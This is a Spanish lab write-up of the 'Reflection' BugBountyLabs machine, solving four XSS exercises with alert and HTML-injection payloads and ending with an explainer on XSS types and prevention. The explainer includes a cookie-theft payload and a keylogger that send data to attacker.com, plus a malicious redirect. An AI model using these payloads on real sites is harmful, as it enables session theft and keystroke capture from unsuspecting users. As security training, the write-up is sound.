---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reflection BugBountyLabs (Principiante)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip bugbountylabs_reflection.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
python3 bugbountylabs_reflection.py
```

Info:

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗    ██╗      █████╗ ██████╗ ███████╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝    ██║     ██╔══██╗██╔══██╗██╔════╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝     ██║     ███████║██████╔╝███████╗
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝      ██║     ██╔══██║██╔══██╗╚════██║
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║       ███████╗██║  ██║██████╔╝███████║
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝       ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝

Fundadores
El Pingüino de Mario
Curiosidades De Hackers

Cofundadores
Zunderrub
CondorHacks
Lenam

Descargando la máquina reflection, espere por favor...

[########################################] 100%
Descarga completa.
La IP de la máquina reflection es -> 172.17.0.2

Presiona Ctrl+C para detener la máquina
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 10:12 CET
Nmap scan report for ssti.dl (172.17.0.2)
Host is up (0.000029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Laboratorio de Cross-Site Scripting (XSS)
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
```

Vemos que hay un puerto `80`, si entramos veremos una pagina web con varios laboratorios para practicar `XSS`, por lo que vamos hacerlos uno por uno.

## LAB 1 (Reflection XSS)

Entrando dentro de dicho laboratorio veremos una parte en el que podremos enviar un mensaje y se refleja lo que escribamos, pero si nosotros probamos a inyectar un `XSS` de la siguiente forma:

```html
<h1 style="color: red">XSS</h1>
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Vemos que esta funcionando de forma correcta, por lo que habremos terminado dicho laboratorio.

## LAB 2 (Stored XSS)

Entrando dentro de dicho laboratorio veremos que hay un cuadro de texto, lo que pongamos se va a reflejar, pero en este caso el `XSS` que inyectemos se va a quedar a parte de reflejado guardado, por lo que cada vez que se recargue la pagina o cualquier usuario entre en dicha pagina se le va a ejecutar el `XSS` en este caso utilizaremos el siguiente `payload`:

```html
<img src="x" onerror="alert('XSS Stored!')">
```

Y si le damos a `guardar mensaje` veremos que nos salta el `XSS` y si cargamos la pagina nos vuelve aparecer:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que habremos terminado este laboratorio.

## LAB 3 (XSS con dropdowns)

Entrando dentro de dicho laboratorio veremos unas cuantas listas para poder elegir opciones, vamos abrir `BuprSuite` y dentro de la peticion que vamos a capturar cuando le demos a `enviar`, veremos la peticion, pero vamos a inyectar 2 `payloads` de `XSS` pero codificados en `URLCode` ya que va por `GET` mediante la `URL` y no por `POST`, por lo que tendra que quedar algo asi:

```
GET /laboratorio3/?opcion1=%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%28%27XSS%20Stored%21%27%29%22%3E&opcion2=ValorY&opcion3=%3Ch1%3EXSS%3C%2Fh1%3E HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://172.17.0.2/laboratorio3/?opcion1=ValorB&opcion2=ValorX&opcion3=Opcion2
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

> Payload 1

```
<img src="x" onerror="alert('XSS Stored!')">

Codificado:

%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%28%27XSS%20Stored%21%27%29%22%3E
```

> Payload 2

```
<h1>XSS</h1>

Codificado:

%3Ch1%3EXSS%3C%2Fh1%3E
```

Ahora si lo enviamos veremos lo siguiente en la pagina:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Veremos que funciona de forma correcta, por lo que habremos terminado este laboratorio.

## LAB 4 (Reflected XSS a traves de la URL)

Entrando dentro de dicho laboratorio veremos que lo que contenga el parametro `data=` se reflejara en la pagina web, por lo que desde la `URL` vamos a inyectar un `XSS` desde la `URL` para que se refleje en la pagina web, haciendo lo siguiente:

```
URL = http://172.17.0.2/laboratorio4/?data=<h2 style="color: red;">XSS_URL</h2>
```

Y veremos lo siguiente cuando lo enviemos.

<figure><img src="../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

Vamos a ver que ha funcionado, por lo que habremos terminado dicho laboratorio.

Con esto ya habremos terminado la maquina con sus laboratorios, sobre la vulnerabilidad `XSS`.

## Explicación detallada del `XSS`

### **Vulnerabilidad XSS (Cross-Site Scripting)**

### **¿Qué es XSS?**

Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante inyectar scripts maliciosos en páginas web vistas por otros usuarios. Estos scripts pueden robar cookies, redirigir a usuarios, registrar pulsaciones de teclas, modificar el contenido de la página y realizar ataques más avanzados.

### **Tipos de XSS**

| Tipo de XSS                   | Descripción                                                                                                                                   | Impacto                                      |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------- |
| **Stored XSS (Persistente)**  | El atacante inyecta código malicioso en la base de datos de la aplicación. Afecta a todos los usuarios que accedan al contenido comprometido. | Alto                                         |
| **Reflected XSS (Reflejado)** | El código malicioso se incluye en una URL y se ejecuta cuando la víctima accede a ella. No se almacena en la aplicación.                      | Medio                                        |
| **DOM-Based XSS**             | La vulnerabilidad ocurre en el lado del cliente cuando JavaScript manipula el DOM sin validaciones adecuadas.                                 | Variable (depende del impacto en el cliente) |

***

### **Payloads de XSS por Categoría**

#### **1️⃣ Stored XSS (XSS Persistente)**

Se almacena en la base de datos y afecta a múltiples usuarios.

**📌 Payload básico (alert en imagen rota):**

```html
<img src="x" onerror="alert('XSS Stored!')">
```

**📌 Payload para robar cookies:**

```html
<img src="x" onerror="fetch('http://attacker.com/steal.php?cookie=' + document.cookie)">
```

**📌 Payload para inyectar un keylogger:**

```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log.php?key=' + e.key);
};
</script>
```

***

#### **2️⃣ Reflected XSS (XSS Reflejado)**

El script malicioso se envía en una URL y se ejecuta en la respuesta de la aplicación.

**📌 Payload de URL con `alert()`:**

```
http://victima.com/search?q=<script>alert('XSS')</script>
```

**📌 Payload para redirigir a un sitio malicioso:**

```
http://victima.com/search?q=<script>window.location='http://attacker.com'</script>
```

***

#### **3️⃣ DOM-Based XSS**

El ataque ocurre en el lado del cliente cuando se manipula el DOM sin sanitización.

**📌 Payload si la página usa `document.write()`:**

```html
<script>document.write('<img src=x onerror=alert("DOM XSS")>');</script>
```

**📌 Payload si usa `innerHTML`:**

```html
<p id="output"></p>
<script>
    var userInput = "<img src=x onerror=alert('XSS')>";
    document.getElementById('output').innerHTML = userInput;
</script>
```

***

### **Prevención de XSS**

| Técnica                           | Descripción                                                             |
| --------------------------------- | ----------------------------------------------------------------------- |
| **Escapar caracteres especiales** | Convierte `<script>` en `&lt;script&gt;` para evitar ejecución.         |
| **Validar y sanear entradas**     | No permitir etiquetas HTML o JavaScript en entradas de usuario.         |
| **Content Security Policy (CSP)** | Restringe qué scripts pueden ejecutarse en la aplicación.               |
| **Uso de HTTPOnly en cookies**    | Evita que JavaScript acceda a cookies sensibles como `document.cookie`. |

***

#### **Conclusión**

XSS es una vulnerabilidad grave que puede comprometer la seguridad de una aplicación web y sus usuarios. La mejor manera de evitarlo es aplicar **validación de entrada, escape de caracteres especiales y políticas de seguridad como CSP**.
